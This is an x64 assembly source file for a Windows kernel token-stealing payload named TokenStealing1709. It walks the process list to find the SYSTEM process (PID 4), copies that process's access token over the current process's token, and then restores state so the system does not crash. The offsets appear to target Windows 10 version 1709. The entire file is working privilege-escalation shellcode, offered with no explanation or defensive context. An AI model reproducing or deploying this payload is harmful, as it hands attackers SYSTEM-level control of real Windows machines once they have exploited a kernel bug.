PUBLIC TokenStealing1709

_DATA SEGMENT
_DATA ENDS

_TEXT SEGMENT

EXTERN ptr_info_control_registers: qword

TokenStealing1709 PROC

	start:
		mov rdx, qword ptr gs:[188h]   ;KTHREAD pointer
		mov r8, [rdx+0b8h]    ;EPROCESS pointer
		mov r9, [r8+2e8h]    ;ActiveProcessLinks list head
		mov rcx, [r9]        ;follow link to first process in list
	find_system:
		mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
		cmp rdx, 4           ;UniqueProcessId == 4? 
		jz found_system      ;YES - move on
		mov rcx, [rcx]       ;NO - load next entry in list
		jmp find_system      ;loop
	found_system:
		mov rax, [rcx+70h]   ;offset to token
		and al, 0f0h         ;clear low 4 bits of _EX_FAST_REF structure
		mov [r8+358h], rax   ;copy SYSTEM token over top of this process's token
	do_not_crash:
		mov rcx, ptr_info_control_registers
		add rcx, 18h
		mov ecx, dword ptr [rcx]
		mov rax, 0
		ret

TokenStealing1709 ENDP


_TEXT ENDS

END